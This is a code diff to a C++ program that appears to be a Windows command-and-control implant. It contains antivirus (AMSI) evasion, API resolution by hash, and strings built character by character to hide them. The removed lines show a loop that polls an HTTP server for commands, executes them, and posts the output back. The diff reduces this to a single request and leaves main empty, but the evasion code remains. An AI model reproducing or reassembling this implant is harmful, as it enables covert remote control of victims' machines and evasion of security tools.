@@ -360,7 +360,7 @@
 
 using namespace HttpLib;
 
-int main() {
+void go() {
     PathAmsi();
     ApiResolve api;
     constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
@@ -374,7 +374,7 @@ int main() {
     _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)api.GetApiAddress(lpKernel32, hashLoadLibraryA);
     const char sDll[] = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
     pLoadLibraryA(sDll);
-    wchar_t url[] = {L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0', L'/', L'p', L'o', L'l', L'l', L'\0'};
+    wchar_t url[] = {L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0',  L'\0'};
     wchar_t url2[] = { L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0', L'/', L'r', L'e', L's', L'u', L'l', L't', L'\0'};
     HttpClient client;
     STARTUPINFOW si = { 0 };
@@ -401,25 +401,13 @@ int main() {
     constexpr unsigned int hashSleep = ComplexHashForAnsi("Sleep");
     _Sleep pSleep = (_Sleep)api.GetApiAddress(lpKernel32, hashSleep);
 
-    while (1) {
-        HttpResponse response;
-        HttpResponse_Init(&response);
+    HttpResponse response;
+    HttpResponse_Init(&response);
 
-        client.Get(&response, url);
+    client.Get(&response, url);
 
-        if (response.bodyLength) {
-            wchar_t* output = NULL;
-            if (Exec(response.body, &output)) {
-                if (crt_wcslen(output)) {
-                    client.Post(&response, url2, output, crt_wcslen(output));
-                }
-            }
-        }
+}
 
-        HttpResponse_Free(&response);
-
-
-        pSleep(1000);
-    }
+int main() {
 
 }
